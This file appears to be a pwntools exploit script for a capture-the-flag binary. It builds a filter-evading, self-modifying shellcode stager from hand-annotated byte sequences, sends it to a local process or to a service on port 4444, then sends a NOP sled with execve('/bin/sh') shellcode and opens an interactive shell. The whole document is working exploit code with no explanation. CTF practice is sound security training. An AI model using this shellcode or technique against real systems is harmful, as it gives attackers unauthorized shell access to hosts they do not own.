#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '127.0.0.1'
port = 4444

binary = "./s4e44co4e"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")


if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  raw_input("@")

  payload  = "\x48\xb8\x04\x40\x44\x44\x44\x44\x04\x04"     #       movabs rax,0x404040404040404
  payload += "\x34\x04"                #                            xor    al,0x4
  payload += "\x50"                    #                            push   rax
  payload += "\x8c\xe0"                #                            mov    eax,fs
  payload += "\x1c\x04"                #                            sbb    al,0x4
  payload += "\x1c\x04"                #                            sbb    al,0x4
  payload += "\x04\x10"                #                            add    al,0x10

  payload += "\xc0\x2c\x04\x04"        #                            shr    BYTE PTR [rsp+rax*1],0x4
  payload += "\x1c\xfc"                #                            sbb    al,0xfc
  payload += "\x1c\x08"                #                            sbb    al,0x8

  payload += "\x04\x04"                #                            add    al,0x4
  payload += "\xc0\x2c\x04\x04"        #                            shr    BYTE PTR [rsp+rax*1],0x4

  payload += "\x58"                    #                            pop    rax


  payload += "\xb4\x44"                #                            mov    ah,0x44
  payload += "\x80\x18\xfc"            #                            sbb    BYTE PTR [rax],0xfc
  payload += "\x80\x18\x04"            #                            sbb    BYTE PTR [rax],0x4
  payload += "\x80\x10\x18"            #                            adc    BYTE PTR [rax],0x18

  payload += "\x14\x04"                #                            adc    al,0x4
  payload += "\x2c\x04"                #                            sub    al,0x4

  payload += "\x80\x10\x08"            #                            adc    BYTE PTR [rax],0x8
  payload += "\x80\x10\x04"            #                            adc    BYTE PTR [rax],0x4

  payload += "\x28\xc4"                #                            sub    ah,al
  payload += "\x28\xc4"                #                            sub    ah,al
  payload += "\x28\xc4"                #                            sub    ah,al

  payload += "\x80\x10\x04"            #                            adc    BYTE PTR [rax],0x4
  payload += "\x80\x10\x8c"            #                            adc    BYTE PTR [rax],0x8c

  payload += "\x10\xc4"                #                            adc    ah,al


  payload += "\x80\x10\xfc"            #                            adc    BYTE PTR [rax],0xfc
  payload += "\x80\x10\xfc"            #                            adc    BYTE PTR [rax],0xfc
  payload += "\x80\x10\x9c"            #                            adc    BYTE PTR [rax],0x90


  payload = payload.ljust(0x100,"\xf8")

  payload += chr(4*18) + chr(0xfc)  + chr(4*12)  #               lea    rsi,[rax]


  payload += "\x8c\xe0"                #                            mov    eax,fs
  payload += "\xb4\x08"                #                            mov    ah,0x08

  payload = payload.ljust(0x200,"\xf8")

  payload += chr(4*18) + chr(0xfc)               #               xchg   rdx,rax

  payload += "\x8c\xe0"                #                            mov    eax,fs

 
  payload = payload.ljust(0x444,"\xf8")
  r.send(payload)
  payload = "\x90"*0x400+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  time.sleep(0.1)
  r.send(payload)

  r.interactive()

